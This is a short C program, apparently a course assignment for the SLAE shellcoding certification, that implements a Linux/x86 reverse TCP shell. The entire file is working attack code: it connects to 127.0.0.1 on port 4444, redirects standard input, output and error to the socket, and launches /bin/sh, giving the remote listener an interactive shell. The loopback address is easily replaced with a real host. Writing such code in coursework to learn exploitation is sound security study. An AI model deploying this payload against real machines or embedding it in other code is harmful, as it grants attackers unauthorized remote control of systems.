// SLAE - Assignment #1: Shell Reverse TCP (Linux/x86) 
// Author:  Dipsy 
// Student ID: SLAE-1535

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main (){
    int sockfd; //socket file descriptor
    struct sockaddr_in addr; //victim 
    
    //setting properties of the victim
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 

    //create new socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    //connect
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    
    //dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
    for (int i = 0; i < 3; i++)
      dup2(sockfd, i);
      
    execve("/bin/sh", NULL, NULL);
    
    return 0;
}
